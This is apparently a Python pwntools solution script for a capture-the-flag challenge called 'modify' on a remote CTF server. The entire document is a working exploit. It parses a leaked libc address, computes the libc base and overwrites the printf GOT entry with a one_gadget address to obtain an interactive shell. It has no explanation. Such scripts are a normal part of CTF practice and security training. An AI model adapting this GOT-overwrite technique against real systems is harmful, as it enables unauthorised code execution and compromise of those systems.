from pwn import *
r=remote("ctf.subhack.xyz",1003)
lib=ELF("/GitHub/Writeup/Wargame/PwnPwn/pwn/modify_challenge/libc.so.6")
b=ELF("/GitHub/Writeup/Wargame/PwnPwn/pwn/modify_challenge/modify")
context.log_level='debug'
oneshot=[0x45226,0x4527a,0xf0364,0xf1207]
r.recvuntil(": ")
libcbase=int(r.recvline().strip(),16)-lib.symbols['_IO_2_1_stdout_']
log.info(hex(libcbase))
log.info(hex(libcbase+oneshot[2]))
r.sendlineafter("? : ",str(b.got['printf']))
r.sendlineafter("to : ",str(libcbase+oneshot[3]))
r.interactive()